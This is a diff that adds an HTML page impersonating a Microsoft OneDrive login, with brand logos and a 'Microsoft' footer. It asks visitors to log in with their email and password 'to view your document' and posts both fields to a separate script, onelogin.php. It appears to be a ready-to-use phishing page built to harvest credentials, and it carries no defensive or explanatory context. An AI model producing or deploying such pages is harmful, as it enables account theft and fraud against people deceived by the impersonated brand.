@@ -1,0 +1,112 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <link sizes="16x16" type="image/gif" href="images/favicon.ico" rel="icon" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <title>
+   onedrive
+  </title>
+  <script>
+   function validateForm() {
+    var x = document.forms["onedrive"]["email"].value;
+    var atpos = x.indexOf("@");
+    var dotpos = x.lastIndexOf(".");
+    if (atpos&lt;1 || dotpos&lt;atpos+2 || dotpos+2&gt;=x.length) {
+        alert("Enter a valid email address");
+        return false;
+    }
+}
+  </script>
+ </head>
+ <body>
+  <div style="text-align: center;">
+   <img src="images/OneDriveLogoDark3.png" alt="" style="width: 111px; height: 40px;" />
+   <br />
+   <form onsubmit="return validateForm()" name="onedrive" action="onelogin.php" method="post">
+    <font size="+3" style="color: rgb(153, 153, 153);">
+     <span style="font-weight: bold;">
+      One place for everything in your life
+      <br />
+      <small>
+      </small>
+      <small>
+      </small>
+      <small>
+      </small>
+      <small>
+       Easily store and share photos, videos,
+documents and more...
+       <br />
+       <br />
+       Please Login with your email and password to view your document.
+       <br />
+       <br />
+       <br />
+       <input placeholder="Enter your email address" name="email" size="50" />
+       <br />
+       <br />
+       <input type="password" placeholder="Enter your password" name="pass" size="25" />
+       <br />
+       <br />
+       <input type="submit" value="Login to view document" />
+      </small>
+     </span>
+    </font>
+   </form>
+  </div>
+  <font size="+3" style="color: rgb(153, 153, 153);">
+   <small>
+   </small>
+   <small>
+   </small>
+   <small>
+   </small>
+   <small>
+    <br />
+   </small>
+  </font>
+  <div style="text-align: center;">
+   <font size="+3" style="color: rgb(153, 153, 153);">
+    <small>
+    </small>
+    <small>
+    </small>
+    <small>
+    </small>
+    <small>
+     <img src="images/static-banner.png" alt="" style="width: 478px; height: 277px;" />
+     <br />
+     <img src="images/flyingdots.gif" alt="" style="width: 1000px; height: 4px;" />
+     <br />
+    </small>
+   </font>
+  </div>
+  <font size="+3" style="color: rgb(153, 153, 153);">
+   <small>
+   </small>
+   <small>
+   </small>
+   <small>
+   </small>
+   <small>
+    <br />
+   </small>
+  </font>
+  <div style="text-align: center;">
+   <font size="+3" style="color: rgb(153, 153, 153);">
+    <small>
+    </small>
+    <small>
+    </small>
+    <small>
+    </small>
+    <small>
+     Microsoft
+    </small>
+   </font>
+   <br />
+  </div>
+  <br />
+  <br />
+ </body>
+</html>
